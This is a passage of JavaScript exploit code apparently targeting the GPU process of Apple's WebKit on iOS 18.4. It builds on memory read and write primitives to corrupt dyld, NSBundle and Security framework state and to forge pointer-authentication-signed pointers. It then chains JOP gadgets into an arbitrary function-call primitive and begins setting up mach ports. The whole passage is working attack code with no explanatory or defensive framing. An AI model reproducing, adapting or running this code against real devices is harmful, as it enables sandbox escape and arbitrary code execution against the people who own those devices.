    LOG(`webProcessConnectionsMap.size: ${webProcessConnectionsMapData.size}`);
    let myWebProcessConnection;
    let remoteRenderingBackend2;
    let remoteRenderingBackend3;
    let remoteRenderingBackend4;
    for (const identifier of webProcessConnectionsMapData.keys()) {
      const webProcessConnection = webProcessConnectionsMapData.get(identifier);
      LOG(`  [${identifier.hex()}] (WebProcess)${webProcessConnection.hex()}`);
      const remoteRenderingBackendMap = gpu_slow_read64(webProcessConnection + 0xe8n);
      LOG(`    .remoteRenderingBackendMap = ${remoteRenderingBackendMap.hex()}`);
      if (remoteRenderingBackendMap) {
        const remoteRenderingBackendMapData = gpu_slow_read_hashmap(remoteRenderingBackendMap);
        if (remoteRenderingBackendMapData.get(backendConnection2.identifier)) {
          myWebProcessConnection = webProcessConnection;
          remoteRenderingBackend2 = remoteRenderingBackendMapData.get(backendConnection2.identifier);
          remoteRenderingBackend3 = remoteRenderingBackendMapData.get(backendConnection3.identifier);
          remoteRenderingBackend4 = remoteRenderingBackendMapData.get(backendConnection4.identifier);
          break;
        }
      }
    }
    ASSERT(myWebProcessConnection, 'myWebProcessConnection not found');
    LOG(`myWebProcessConnection: ${myWebProcessConnection.hex()}`);
    ASSERT(remoteRenderingBackend2);
    LOG(`remoteRenderingBackend2: ${remoteRenderingBackend2.hex()}`);
    ASSERT(remoteRenderingBackend3);
    LOG(`remoteRenderingBackend3: ${remoteRenderingBackend3.hex()}`);
    ASSERT(remoteRenderingBackend4);
    LOG(`remoteRenderingBackend4: ${remoteRenderingBackend4.hex()}`);
    const remoteImageBuffersMap2 = gpu_slow_read64(remoteRenderingBackend2 + 0x78n);
    ASSERT(remoteImageBuffersMap2);
    LOG(`remoteImageBuffersMap2: ${remoteImageBuffersMap2.hex()}`);
    const remoteImageBuffersMap3 = gpu_slow_read64(remoteRenderingBackend3 + 0x78n);
    ASSERT(remoteImageBuffersMap3);
    LOG(`remoteImageBuffersMap3: ${remoteImageBuffersMap3.hex()}`);
    const remoteImageBuffersMap4 = gpu_slow_read64(remoteRenderingBackend4 + 0x78n);
    ASSERT(remoteImageBuffersMap4);
    LOG(`remoteImageBuffersMap4: ${remoteImageBuffersMap4.hex()}`);
    const remoteImageBuffersMapData2 = gpu_slow_read_hashmap(remoteImageBuffersMap2);
    const remoteImageBuffersMapData3 = gpu_slow_read_hashmap(remoteImageBuffersMap3);
    const remoteImageBuffersMapData4 = gpu_slow_read_hashmap(remoteImageBuffersMap4);
    const remoteImageBuffer1 = remoteImageBuffersMapData2.get(imageBufferIdentifier1);
    LOG(`remoteImageBuffer1: ${remoteImageBuffer1.hex()}`);
    const remoteImageBuffer2 = remoteImageBuffersMapData2.get(imageBufferIdentifier2);
    LOG(`remoteImageBuffer2: ${remoteImageBuffer2.hex()}`);
    const remoteImageBuffer3 = remoteImageBuffersMapData3.get(imageBufferIdentifier3);
    LOG(`remoteImageBuffer3: ${remoteImageBuffer3.hex()}`);
    const remoteImageBuffer4 = remoteImageBuffersMapData3.get(imageBufferIdentifier4);
    LOG(`remoteImageBuffer4: ${remoteImageBuffer4.hex()}`);
    const remoteImageBuffer5 = remoteImageBuffersMapData4.get(imageBufferIdentifier5);
    LOG(`remoteImageBuffer5: ${remoteImageBuffer5.hex()}`);
    const remoteImageBuffer6 = remoteImageBuffersMapData4.get(imageBufferIdentifier6);
    LOG(`remoteImageBuffer6: ${remoteImageBuffer6.hex()}`);
    const imageBuffer1 = gpu_slow_read64(remoteImageBuffer1 + 0x18n);
    LOG(`imageBuffer1: ${imageBuffer1.hex()}`);
    const imageBuffer2 = gpu_slow_read64(remoteImageBuffer2 + 0x18n);
    LOG(`imageBuffer2: ${imageBuffer2.hex()}`);
    const imageBuffer3 = gpu_slow_read64(remoteImageBuffer3 + 0x18n);
    LOG(`imageBuffer3: ${imageBuffer3.hex()}`);
    const imageBuffer4 = gpu_slow_read64(remoteImageBuffer4 + 0x18n);
    LOG(`imageBuffer4: ${imageBuffer4.hex()}`);
    const imageBuffer5 = gpu_slow_read64(remoteImageBuffer5 + 0x18n);
    LOG(`imageBuffer5: ${imageBuffer5.hex()}`);
    const imageBuffer6 = gpu_slow_read64(remoteImageBuffer6 + 0x18n);
    LOG(`imageBuffer6: ${imageBuffer6.hex()}`);
    gpu_slow_write64(imageBuffer1 + 0x20n, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
    RemoteRenderingBackend_ReleaseImageBuffer(backendConnection2, imageBufferIdentifier1);
    const NSBundleTables = gpu_slow_read64(offsets.Foundation__NSBundleTables_bundleTables_value);
    LOG(`NSBundleTables: ${NSBundleTables.hex()}`);
    const loadedFrameworks = gpu_slow_read64(NSBundleTables + 0x20n);
    LOG(`loadedFrameworks: ${loadedFrameworks.hex()}`);
    const loadedFrameworks_length = gpu_slow_read64(loadedFrameworks + 0x30n);
    LOG(`loadedFrameworks_length: ${loadedFrameworks_length.hex()}`);
    const loadedFrameworks_buffer = gpu_slow_read64(loadedFrameworks + 8n);
    LOG(`loadedFrameworks_buffer: ${loadedFrameworks_buffer.hex()}`);
    for (let i = 0n; i < loadedFrameworks_length; ++i) {
      const bundle = gpu_slow_read64(loadedFrameworks_buffer + 8n * i);
      if (bundle <= 0x1_00000000n) continue;
      LOG(`bundle[${i}]: ${bundle.hex()}`);
      const initialPath = gpu_slow_read64(bundle + 0x28n);
      if (initialPath != offsets.AVFAudio__cfstr_SystemLibraryTextToSpeech) continue;
      TextToSpeech_NSBundle = bundle;
      break;
    }
    LOG(`TextToSpeech_NSBundle: ${TextToSpeech_NSBundle.hex()}`);
    const TextToSpeech_CFBundle = gpu_slow_read64(TextToSpeech_NSBundle + 0x10n);
    LOG(`TextToSpeech_CFBundle: ${TextToSpeech_CFBundle.hex()}`);
    function gpu_slow_write8(ptr, u16) {
      let value = gpu_slow_read64(ptr);
      value &= ~0xffn;
      value |= u16;
      gpu_slow_write64(ptr, value);
    }
    gpu_slow_write64(TextToSpeech_NSBundle + 8n, 0x40008n);
    gpu_slow_write8(TextToSpeech_CFBundle + 0x34n, 0n);
    gpu_slow_write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    gpu_slow_write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.libARI_cstring);
    gpu_slow_write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x15n);
    gpu_slow_write64(TextToSpeech_CFBundle + 0x68n, offsets.CFNetwork__gConstantCFStringValueTable);
    gpu_slow_write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x102n);
    gpu_slow_write64(imageBuffer2 + 0x20n, offsets.TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit);
    RemoteRenderingBackend_ReleaseImageBuffer_NoWait(backendConnection2, imageBufferIdentifier2);
    const runtimeState = gpu_slow_read64(offsets.libdyld__gAPIs);
    LOG(`runtimeState: ${runtimeState.hex()}`);
    const runtimeStateLock = gpu_slow_read64(runtimeState + 0x70n);
    LOG(`runtimeStateLock: ${runtimeStateLock.hex()}`);
    const p_InterposeTupleAll_buffer = runtimeState + 0xb8n;
    LOG(`p_InterposeTupleAll_buffer: ${p_InterposeTupleAll_buffer.hex()}`);
    const p_InterposeTupleAll_size = runtimeState + 0xc0n;
    LOG(`p_InterposeTupleAll_size: ${p_InterposeTupleAll_size.hex()}`);
    const runtimeState_vtable = gpu_slow_read64(runtimeState).noPAC();
    LOG(`runtimeState_vtable: ${runtimeState_vtable.hex()}`);
    const dyld_emptySlot = gpu_slow_read64(runtimeState_vtable).noPAC();
    LOG(`dyld_emptySlot: ${dyld_emptySlot.hex()}`);
    const dyld_offset = offsets.dyld__RuntimeState_emptySlot - dyld_emptySlot - p.slide;
    LOG(`dyld_offset: ${dyld_offset.hex()}`);
    let dlopen_from_lambda_ret = offsets.dyld__dlopen_from_lambda_ret - p.slide - dyld_offset;
    LOG(`dlopen_from_lambda_ret: ${dlopen_from_lambda_ret.hex()}`);
    dlopen_from_lambda_ret = dlopen_from_lambda_ret & 0xffffffffn;
    const workQueue = gpu_slow_read64(remoteRenderingBackend2 + 0x20n);
    LOG(`workQueue: ${workQueue.hex()}`);
    const backend2_processingThread = gpu_slow_read64(workQueue + 0x30n);
    LOG(`backend2_processingThread: ${backend2_processingThread.hex()}`);
    const stack_bottom = gpu_slow_read64(backend2_processingThread + 0x10n);
    LOG(`stack_bottom: ${stack_bottom.hex()}`);
    const stack_top = gpu_slow_read64(backend2_processingThread + 0x18n);
    LOG(`stack_top: ${stack_top.hex()}`);
    while (true) {
      const lr = gpu_slow_read64(stack_bottom - 0x18c8n) & 0xffff_ffffn;
      if (lr == dlopen_from_lambda_ret) break;
    }
    LOG('RemoteRenderingBackend2 has been mutex-locked');
    const loader = stack_bottom - 0x18c8n + 0x78n;
    LOG(`loader: ${loader.hex()}`);
    let bss = offsets.DesktopServicesPriv_bss;
    LOG(`bss: ${bss.hex()}`);
    function alloc_bss(size) {
      const res = bss;
      bss += size;
      return res;
    }
    const prev_metadata_ptr = alloc_bss(0x10n);
    LOG(`prev_metadata_ptr: ${prev_metadata_ptr.hex()}`);
    const metadata_ptr = alloc_bss(0x10n);
    LOG(`metadata_ptr: ${metadata_ptr.hex()}`);
    const invoker_arg = alloc_bss(0x10n);
    LOG(`invoker_arg: ${invoker_arg.hex()}`);
    const invoker_x0 = alloc_bss(0x60n);
    LOG(`invoker_x0: ${invoker_x0.hex()}`);
    const gSecurityd = alloc_bss(0x100n);
    LOG(`gSecurityd: ${gSecurityd.hex()}`);
    const slowFcallResult = alloc_bss(0x10n);
    LOG(`slowFcallResult: ${slowFcallResult.hex()}`);
    const gpu_string_buffer = alloc_bss(0x20n);
    LOG(`gpu_string_buffer: ${gpu_string_buffer.hex()}`);
    const signPointerSelf = alloc_bss(0x10n);
    LOG(`signPointerSelf: ${signPointerSelf.hex()}`);
    const interposingTuples_ptr = alloc_bss(0x100n);
    LOG(`interposingTuples_ptr: ${interposingTuples_ptr.hex()}`);
    gpu_slow_write64(prev_metadata_ptr, prev_metadata_ptr);
    gpu_slow_write64(prev_metadata_ptr + 8n, 1n);
    gpu_slow_write64(metadata_ptr, prev_metadata_ptr);
    gpu_slow_write64(metadata_ptr + 8n, metadata_ptr + 0x10n - interposingTuples_ptr | 1n);
    gpu_slow_write64(loader, p_InterposeTupleAll_buffer - 0x10n);
    gpu_slow_write64(loader + 8n, metadata_ptr + 0x10n);
    gpu_slow_write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    gpu_slow_write64(TextToSpeech_NSBundle + 0x40n, 0n);
    gpu_slow_write64(runtimeStateLock + 0x20n, 0n);
    gpu_slow_write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.HOMEUI_cstring);
    gpu_slow_write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x3bn);
    gpu_slow_write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x101n);
    gpu_slow_write64(imageBuffer3 + 0x20n, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice);
    RemoteRenderingBackend_ReleaseImageBuffer(backendConnection3, imageBufferIdentifier3);
    while (true) {
      const InterposeTupleAll_buffer = gpu_slow_read64(p_InterposeTupleAll_buffer);
      if (InterposeTupleAll_buffer) {
        LOG(`InterposeTupleAll_buffer: ${InterposeTupleAll_buffer.hex()}`);
        break;
      }
      sleep(10);
    }
    LOG(`RemoteRenderingBackend2 has been spin-locked`);
    gpu_slow_write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x102n);
    gpu_slow_write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    gpu_slow_write64(TextToSpeech_NSBundle + 0x40n, 0n);
    gpu_slow_write64(TextToSpeech_NSBundle + 8n, 0x40008n);
    gpu_slow_write8(TextToSpeech_CFBundle + 0x34n, 0n);
    gpu_slow_write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.PerfPowerServicesReader_cstring);
    gpu_slow_write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x5bn);
    gpu_slow_write64(imageBuffer4 + 0x20n, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker);
    gpu_slow_write64(runtimeStateLock + 0x20n, 0n);
    RemoteRenderingBackend_ReleaseImageBuffer_NoWait(backendConnection3, imageBufferIdentifier4);
    const backend3_workQueue = gpu_slow_read64(remoteRenderingBackend3 + 0x20n);
    LOG(`backend3_workQueue: ${backend3_workQueue.hex()}`);
    const backend3_processingThread = gpu_slow_read64(backend3_workQueue + 0x30n);
    LOG(`backend3_processingThread: ${backend3_processingThread.hex()}`);
    const backend3_stack_bottom = gpu_slow_read64(backend3_processingThread + 0x10n);
    LOG(`backend3_stack_bottom: ${backend3_stack_bottom.hex()}`);
    const backend3_stack_top = gpu_slow_read64(backend3_processingThread + 0x18n);
    LOG(`backend3_stack_top: ${backend3_stack_top.hex()}`);
    while (true) {
      const lr = gpu_slow_read64(backend3_stack_bottom - 0x17a8n) & 0xffff_ffffn;
      if (lr == dlopen_from_lambda_ret) break;
      sleep(10);
    }
    LOG('RenderingBackend3 has been mutex-locked');
    const backend3_loader = backend3_stack_bottom - 0x17a8n + 0x78n;
    LOG(`backend3_loader: ${backend3_loader.hex()}`);
    gpu_slow_write64(metadata_ptr + 8n, metadata_ptr + 0x10n - 0x100n | 1n);
    gpu_slow_write64(backend3_loader, p_InterposeTupleAll_size - 0x10n);
    gpu_slow_write64(backend3_loader + 8n, metadata_ptr + 0x10n);
    gpu_slow_write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x101n);
    gpu_slow_write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    gpu_slow_write64(TextToSpeech_NSBundle + 0x40n, 0n);
    gpu_slow_write64(runtimeStateLock + 0x20n, 0n);
    gpu_slow_write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.libGPUCompilerImplLazy_cstring);
    gpu_slow_write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x5en);
    gpu_slow_write64(imageBuffer5 + 0x20n, offsets.AVFAudio__OBJC_CLASS__AVSpeechUtterance);
    RemoteRenderingBackend_ReleaseImageBuffer(backendConnection4, imageBufferIdentifier5);
    while (true) {
      const ptr = gpu_slow_read64(p_InterposeTupleAll_size);
      if (ptr === 0x100n) break;
      sleep(10);
    }
    LOG('RenderingBackend3 has been spin-locked');
    let fontIdentifier = 0x1234n;
    LOG(`fontIdentifier: ${fontIdentifier.hex()}`);
    function cacheFont() {
      backendConnection4.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteRenderingBackend_CacheFont, backendConnection4.identifier).encode('uint8_t', 1).encode('uint64_t', fontIdentifier).encode('uint8_t', 1).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint8_t', 0).encode('float', 10).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint32_t', 0x80010000).encode8BitString('file:///System/Library/Fonts/Core/Helvetica.ttc#postscript-name=Helvetica').encode8BitString('Helvetica').encode('uint8_t', 0));
    }
    function releaseFont() {
      backendConnection4.sendMessage(new Encoder(MessageName.RemoteRenderingBackend_ReleaseRenderingResource, backendConnection4.identifier).encode('uint64_t', fontIdentifier));
      backendConnection4.processOutOfStreamMessageAndWait();
    }
    const initMediaAccessibilityMACaptionAppearanceGetDisplayType = gpu_slow_read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType);
    LOG(`initMediaAccessibilityMACaptionAppearanceGetDisplayType: ${initMediaAccessibilityMACaptionAppearanceGetDisplayType.hex()}`);
    gpu_slow_write64(offsets.WebCore__softLinkOTSVGOTSVGTableRelease, initMediaAccessibilityMACaptionAppearanceGetDisplayType);
    let interpose_index = 0n;
    function interpose(ptr, val) {
      gpu_slow_write64(interposingTuples_ptr + interpose_index * 0x10n, val);
      gpu_slow_write64(interposingTuples_ptr + interpose_index * 0x10n + 8n, ptr);
      interpose_index += 1n;
    }
    interpose(offsets.MediaAccessibility__MACaptionAppearanceGetDisplayType, offsets.ImageIO__IIOLoadCMPhotoSymbols);
    interpose(offsets.CMPhoto__CMPhotoCompressionCreateContainerFromImageExt, offsets.libGPUCompilerImplLazy__invoker);
    interpose(offsets.CMPhoto__CMPhotoCompressionCreateDataContainerFromImage, offsets.Security__SecKeychainBackupSyncable_block_invoke);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage, offsets.Security__SecOTRSessionProcessPacketRemote_block_invoke);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddExif, offsets.dyld__signPointer);
    let resourceCacheMap;
    function invoke(x0) {
      cacheFont();
      if (!resourceCacheMap) {
        resourceCacheMap = gpu_slow_read64(remoteRenderingBackend4 + 0x40n);
        LOG(`resourceCacheMap: ${resourceCacheMap.hex()}`);
      }
      const font = gpu_slow_read64(resourceCacheMap + 0x50n);
      gpu_slow_write64(font + 0x120n, x0);
      gpu_slow_write64(font + 0x128n, 1n);
      releaseFont();
    }
    invoke(1n);
    const paciza_invoker = gpu_slow_read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt);
    LOG(`paciza_invoker: ${paciza_invoker.hex()}`);
    const paciza_security_invoker_1 = gpu_slow_read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage);
    LOG(`paciza_security_invoker_1: ${paciza_security_invoker_1.hex()}`);
    const paciza_security_invoker_2 = gpu_slow_read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage);
    LOG(`paciza_security_invoker_2: ${paciza_security_invoker_2.hex()}`);
    const paciza_signPointer = gpu_slow_read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);
    LOG(`paciza_signPointer: ${paciza_signPointer.hex()}`);
    gpu_slow_write64(offsets.Security__gSecurityd, gSecurityd);
    gpu_slow_write64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType, paciza_invoker);
    gpu_slow_write64(invoker_arg + 8n, invoker_x0);
    gpu_slow_write64(slowFcallResult + 8n, slowFcallResult - 0x18n);
    gpu_slow_write64(invoker_x0 + 0x20n, slowFcallResult);
    let invoker_type = 0;
    function gpu_slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
      if (invoker_type != 1) {
        gpu_slow_write64(invoker_arg, paciza_security_invoker_1);
        invoker_type = 1;
      }
      gpu_slow_write64(gSecurityd + 0x78n, pc);
      gpu_slow_write64(invoker_x0 + 0x28n, x0);
      gpu_slow_write64(invoker_x0 + 0x30n, x1);
      gpu_slow_write64(invoker_x0 + 0x38n, x2);
      gpu_slow_write64(slowFcallResult, 0n);
      invoke(invoker_arg);
      while (true) {
        const result = gpu_slow_read64(slowFcallResult);
        if (result) return result;
      }
    }
    function gpu_slow_fcall_2(pc, x0 = -1n, x1 = -1n, x2 = -1n, x3 = -1n) {
      if (invoker_type != 2) {
        gpu_slow_write64(invoker_arg, paciza_security_invoker_2);
        invoker_type = 2;
      }
      gpu_slow_write64(gSecurityd + 0xb8n, pc);
      gpu_slow_write64(invoker_x0 + 0x28n, x0);
      gpu_slow_write64(invoker_x0 + 0x30n, x1);
      gpu_slow_write64(invoker_x0 + 0x38n, x2);
      gpu_slow_write64(invoker_x0 + 0x40n, x3);
      gpu_slow_write64(slowFcallResult, 71n);
      invoke(invoker_arg);
      while (true) {
        const result = gpu_slow_read64(slowFcallResult);
        if (result != 0x71n) return result;
      }
    }
    function gpu_slow_pacia(ptr, ctx) {
      gpu_slow_write64(signPointerSelf, 0x80010000_00000000n | ctx >> 48n << 32n);
      return gpu_slow_fcall_1(paciza_signPointer, signPointerSelf, ctx, ptr);
    }
    function gpu_slow_pacib(ptr, ctx) {
      gpu_slow_write64(signPointerSelf, 0x80030000_00000000n | ctx >> 48n << 32n);
      return gpu_slow_fcall_1(paciza_signPointer, signPointerSelf, ctx, ptr);
    }
    const paciza_pthread_create = gpu_slow_pacia(offsets.pthread_create, 0n);
    LOG(`paciza_pthread_create: ${paciza_pthread_create.hex()}`);
    const paciza_malloc = gpu_slow_pacia(offsets.malloc, 0n);
    LOG(`paciza_malloc: ${paciza_malloc.hex()}`);
    const gadget_control_1 = offsets.gadget_control_1_ios184;
    LOG(`gadget_control_1:${gadget_control_1.hex()}`);
    const gadget_control_2 = offsets.gadget_control_2_ios184;
    LOG(`gadget_control_2:${gadget_control_2.hex()}`);
    const gadget_control_3 = offsets.gadget_control_3_ios184;
    LOG(`gadget_control_3: ${gadget_control_3.hex()}`);
    const gadget_loop_1 = offsets.gadget_loop_1_ios184;
    LOG(`gadget_loop_1: ${gadget_loop_1.hex()}`);
    const gadget_loop_2 = offsets.gadget_loop_2_ios184;
    LOG(`gadget_loop_2: ${gadget_loop_2.hex()}`);
    const gadget_loop_3 = offsets.gadget_loop_3_ios184;
    LOG(`gadget_loop_3: ${gadget_loop_3.hex()}`);
    const gadget_set_all_registers = offsets.gadget_set_all_registers_ios184;
    LOG(`gadget_set_all_registers: ${gadget_set_all_registers.hex()}`);
    const paciza_gadget_loop_1 = gpu_slow_pacia(gadget_loop_1, 0n);
    LOG(`paciza_gadget_loop_1: ${paciza_gadget_loop_1.hex()}`);
    const paciza_gadget_loop_2 = gpu_slow_pacia(gadget_loop_2, 0n);
    LOG(`paciza_gadget_loop_2: ${paciza_gadget_loop_2.hex()}`);
    const paciza_gadget_loop_3 = gpu_slow_pacia(gadget_loop_3, 0n);
    LOG(`paciza_gadget_loop_3: ${paciza_gadget_loop_3.hex()}`);
    const paciza_gadget_control_2 = gpu_slow_pacia(gadget_control_2, 0n);
    LOG(`paciza_gadget_control_2: ${paciza_gadget_control_2.hex()}`);
    const paciza_gadget_control_3 = gpu_slow_pacia(gadget_control_3, 0n);
    LOG(`paciza_gadget_control_3: ${paciza_gadget_control_3.hex()}`);
    const paciza_gadget_control_3_4 = gpu_slow_pacia(gadget_control_3 + 4n, 0n);
    LOG(`paciza_gadget_control_3_4: ${paciza_gadget_control_3_4.hex()}`);
    const paciza_gadget_set_all_registers = gpu_slow_pacia(gadget_set_all_registers, 0n);
    LOG(`paciza_gadget_set_all_registers: ${paciza_gadget_set_all_registers.hex()}`);
    let gpu_memory = gpu_slow_fcall_1(paciza_malloc, 0x4000n);
    LOG(`gpu_memory: ${gpu_memory.hex()}`);
    function allocate_gpu_memory(size) {
      const res = gpu_memory;
      gpu_memory += size;
      return res;
    }
    const jop_thread = allocate_gpu_memory(0x10n);
    const x0 = allocate_gpu_memory(0x20n);
    const x19 = allocate_gpu_memory(0x500n);
    const x22 = allocate_gpu_memory(0x20n);
    const x20 = allocate_gpu_memory(0x30n);
    gpu_slow_write64(x0 + 8n, paciza_gadget_loop_3);
    gpu_slow_fcall_2(paciza_pthread_create, jop_thread, 0n, paciza_gadget_loop_3, x0);
    LOG('GPU fcall thread has been spawned!!');
    const pthread_node = gpu_slow_read64(jop_thread);
    LOG(`pthread_node: ${pthread_node.hex()}`);
    const jop_stack_top = gpu_slow_read64(pthread_node + 0xb8n);
    LOG(`jop_stack_top: ${jop_stack_top.hex()}`);
    const jop_stack_bottom = jop_stack_top + 0x88000n;
    LOG(`jop_stack_bottom: ${jop_stack_bottom.hex()}`);
    const stack = jop_stack_top;
    const paciza_gadget_control_1 = gpu_slow_pacia(gadget_control_1, 0n);
    LOG(`paciza_gadget_control_1: ${paciza_gadget_control_1.hex()}`);
    const pacib_gadget_loop_1_0x80020 = gpu_slow_pacib(gadget_loop_1, stack + 0x80020n);
    LOG(`pacib_gadget_loop_1_0x80020: ${pacib_gadget_loop_1_0x80020.hex()}`);
    const pacib_gadget_loop_1_0x800c0 = gpu_slow_pacib(gadget_loop_1, stack + 0x800c0n);
    LOG(`pacib_gadget_loop_1_0x800c0: ${pacib_gadget_loop_1_0x800c0.hex()}`);
    const pacib_gadget_loop_2_0x80010 = gpu_slow_pacib(gadget_loop_2, stack + 0x80010n);
    LOG(`pacib_gadget_loop_2_0x80010: ${pacib_gadget_loop_2_0x80010.hex()}`);
    const pacib_gadget_loop_2_0x800b0 = gpu_slow_pacib(gadget_loop_2, stack + 0x800b0n);
    LOG(`pacib_gadget_loop_2_0x800b0: ${pacib_gadget_loop_2_0x800b0.hex()}`);
    const MAGIC = 0x41424344n;
    gpu_slow_write64(jop_stack_bottom - 0x4fa0n, stack + 0x80000n);
    gpu_slow_write64(jop_stack_bottom - 0x4f98n, gpu_slow_pacib(gadget_loop_1, jop_stack_top + 0x83070n));
    gpu_slow_write64(jop_stack_bottom - 0x4fb0n, x20);
    gpu_slow_write64(jop_stack_bottom - 0x4fa8n, x19);
    gpu_slow_write64(jop_stack_bottom - 0x4fc0n, x22);
    gpu_slow_write64(x19 + 0x20n, MAGIC);
    gpu_slow_write64(x19, paciza_gadget_loop_1);
    gpu_slow_write64(x0 + 8n, paciza_gadget_control_1);
    while (gpu_slow_read64(x19 + 0x20n) === MAGIC);
    gpu_slow_write64(stack + 0x80008n, pacib_gadget_loop_2_0x80010);
    gpu_slow_write64(x19 + 8n, MAGIC);
    gpu_slow_write64(x20 + 0x10n, paciza_gadget_loop_2);
    gpu_slow_write64(x19, paciza_gadget_control_2);
    while (gpu_slow_read64(x19 + 8n) === MAGIC);
    gpu_slow_write64(x20 + 0x20n, paciza_malloc);
    gpu_slow_write64(x20 + 0x28n, 0n);
    gpu_slow_write64(stack + 0x80018n, pacib_gadget_loop_1_0x80020);
    gpu_slow_write64(x19 + 0x20n, MAGIC);
    gpu_slow_write64(x19, paciza_gadget_loop_1);
    gpu_slow_write64(x20 + 0x10n, paciza_gadget_control_3);
    while (gpu_slow_read64(x19 + 0x20n) === MAGIC);
    gpu_slow_write64(stack + 0x800a8n, pacib_gadget_loop_2_0x800b0);
    gpu_slow_write64(x19 + 8n, MAGIC);
    gpu_slow_write64(x20 + 0x10n, paciza_gadget_loop_2);
    gpu_slow_write64(x19, paciza_gadget_set_all_registers);
    while (gpu_slow_read64(x19 + 8n) === MAGIC);
    gpu_slow_write64(stack + 0x800b0n, stack + 0x80000n);
    gpu_slow_write64(stack + 0x800b8n, pacib_gadget_loop_1_0x800c0);
    gpu_slow_write64(x19 + 0x20n, MAGIC);
    gpu_slow_write64(x19, paciza_gadget_loop_1);
    gpu_slow_write64(x20 + 0x10n, paciza_gadget_control_3_4);
    while (gpu_slow_read64(x19 + 0x20n) === MAGIC);
    const cache = new Map();
    const signPointer = paciza_signPointer.noPAC();
    cache.set(signPointer, paciza_signPointer);
    function gpu_slow_fcall(pc, ...args) {
      if (!cache.has(pc)) {
        cache.set(pc, gpu_slow_pacia(pc, 0n));
      }
      const signed_pc = cache.get(pc);
      gpu_slow_write64(stack + 0x80008n, pacib_gadget_loop_2_0x80010);
      gpu_slow_write64(x19 + 8n, MAGIC);
      gpu_slow_write64(x20 + 0x10n, paciza_gadget_loop_2);
      gpu_slow_write64(x19, paciza_gadget_control_2);
      while (gpu_slow_read64(x19 + 8n) === MAGIC);
      gpu_slow_write64(x20 + 0x20n, signed_pc);
      gpu_slow_write64(x20 + 0x28n, 0n);
      gpu_slow_write64(stack + 0x80018n, pacib_gadget_loop_1_0x80020);
      gpu_slow_write64(x19 + 0x20n, MAGIC);
      gpu_slow_write64(x19, paciza_gadget_loop_1);
      gpu_slow_write64(x20 + 0x10n, paciza_gadget_control_3);
      while (gpu_slow_read64(x19 + 0x20n) === MAGIC);
      for (let i = 0n; i < args.length && i < 8n; ++i) {
        gpu_slow_write64(stack + 0x80098n - i * 8n, args[i]);
      }
      for (let i = 8n; i < args.length; ++i) {
        gpu_slow_write64(stack + 0x80070n + i * 8n, args[i]);
      }
      gpu_slow_write64(stack + 0x800a8n, pacib_gadget_loop_2_0x800b0);
      gpu_slow_write64(x19 + 8n, MAGIC);
      gpu_slow_write64(x20 + 0x10n, paciza_gadget_loop_2);
      gpu_slow_write64(x19, paciza_gadget_set_all_registers);
      while (gpu_slow_read64(x19 + 8n) === MAGIC);
      gpu_slow_write64(stack + 0x800b0n, stack + 0x80000n);
      gpu_slow_write64(stack + 0x800b8n, pacib_gadget_loop_1_0x800c0);
      gpu_slow_write64(x19 + 0x20n, MAGIC);
      gpu_slow_write64(x19, paciza_gadget_loop_1);
      gpu_slow_write64(x20 + 0x10n, paciza_gadget_control_3_4);
      while (true) {
        const result = gpu_slow_read64(x19 + 0x20n);
        if (result !== MAGIC) {
          return result;
        }
      }
    }
    const gpu_connection = gpu_slow_read64(myWebProcessConnection + 0x38n);
    LOG(`gpu_connection: ${gpu_connection.hex()} `);
    const gpu_sendPort = gpu_slow_read32(gpu_connection + 0x138n);
    LOG(`gpu_sendPort: ${gpu_sendPort.hex()} `);
    const gpu_receiveBufferDataPointer = allocate_gpu_memory(receiveBufferSizeAsBigInt);
    LOG(`gpu_receiveBufferDataPointer: ${gpu_receiveBufferDataPointer.hex()} `);
    const scratchPad = allocate_gpu_memory(0x100n);
    LOG(`scratchPad: ${scratchPad.hex()} `);
    class GPURemoteConnection {
      setSendPort(sendPort) {
        this.sendPort = sendPort;
      }
      createReceivePort() {
        let kr = gpu_slow_fcall(offsets.mach_port_allocate, __mach_task_self, 1n, scratchPad + 0x10n);
        ASSERT(!kr, "createReceivePort.mach_port_allocate has been failed");
        this.receivePort = gpu_slow_read32(scratchPad + 0x10n);
        LOG(`this.receivePort: ${this.receivePort.hex()} `);
        kr = gpu_slow_fcall(offsets.mach_port_insert_right, __mach_task_self, this.receivePort, this.receivePort, 0x14n);
        ASSERT(!kr, "createReceivePort.mach_port_insert_right has been failed");
      }
